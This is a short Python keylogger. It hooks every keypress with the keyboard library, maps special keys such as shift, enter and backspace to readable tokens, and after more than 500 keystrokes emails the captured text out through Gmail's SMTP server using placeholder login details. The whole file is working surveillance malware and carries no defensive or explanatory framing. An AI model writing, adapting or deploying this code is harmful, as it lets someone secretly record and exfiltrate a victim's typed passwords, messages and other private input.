import keyboard
import smtplib

List=[]

def print_pressed_keys(e):
    KEY = e.name
    KEY=special_simbols(KEY)
    List.append(KEY)
    print(KEY)
    num=len(List)

    if num>500:
        
        print(List)
        
        smtpObj = smtplib.SMTP('smtp.gmail.com',587)
        smtpObj.starttls()
        smtpObj.login("Login","password")
        message = ("".join(List))

        smtpObj.sendmail("Email_From","Email_To",message)
        print('Сообщение отправленно')
        
        List.clear()
    
def special_simbols(KEY):
    if KEY=='space':
        KEY=' '

    if KEY=='alt'or KEY=='right alt':
        KEY=' alt '

    if KEY=='ctrl'or KEY=='right ctrl':
        KEY=' ctrl '

    if KEY=='shift' or KEY=='right shift':
        KEY=' shift ' 

    if KEY=='enter':
        KEY=' enter '

    if KEY=='backspace':
        KEY=' backspace '
    
    if KEY=='tab':
        KEY=' TAB '
    
    if KEY=='caps lock':
        KEY=' caps lock '
    
    if KEY=='right':
        KEY=' right '

    if KEY=='left':
        KEY=' left '

    if KEY=='up':
        KEY=' up '

    if KEY=='down':
        KEY=' down '

    if KEY=='delete':
        KEY=' delete '

    if KEY=='insert':
        KEY=' insert '
    
    if KEY=='print screen':
        KEY=' print screen '
    
    if KEY=='demical':
        KEY='.'

    if KEY=='left windows':
        KEY=' Windows'

    return KEY


keyboard.on_press(print_pressed_keys)
keyboard.wait('ctrl+z')
